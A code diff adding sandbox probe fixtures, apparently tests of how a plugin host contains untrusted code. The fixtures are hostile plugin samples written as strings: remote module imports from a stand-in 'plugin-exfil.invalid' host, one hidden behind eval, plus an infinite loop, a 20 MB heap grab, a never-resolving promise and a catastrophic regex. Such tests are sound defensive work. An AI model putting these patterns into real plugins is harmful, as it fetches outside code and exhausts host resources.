@@ -82,6 +82,15 @@ export const PROBE_FIXTURES = Object.freeze({
   dynamicImport: `export async function init() { await import("https://plugin-exfil.invalid/module.js"); }`,
   generatedImport: `export async function init() { await eval('import("https://plugin-exfil.invalid/generated.js")'); }`,
   pending: `export async function init() { await new Promise(() => {}); }`,
+  responseLoop: `export async function init(context) {
+    await context.sdk.status.set("Acknowledged turn"); for (;;) {}
+  }`,
+  responseHeap: `export async function init(context) {
+    await context.sdk.status.set("Acknowledged turn"); globalThis.allocation = new ArrayBuffer(20 * 1024 * 1024);
+  }`,
+  responsePending: `export async function init(context) {
+    await context.sdk.status.set("Acknowledged turn"); await new Promise(() => {});
+  }`,
   regex: `export function init() {} export function onEvent() { /^(a+)+$/.test("a".repeat(128) + "!"); }`,
   seatingDenied: `export async function init(context) {
     try { await context.sdk.seating.claimSelfOnEntry("seat-1"); throw new Error("fake seating success"); }
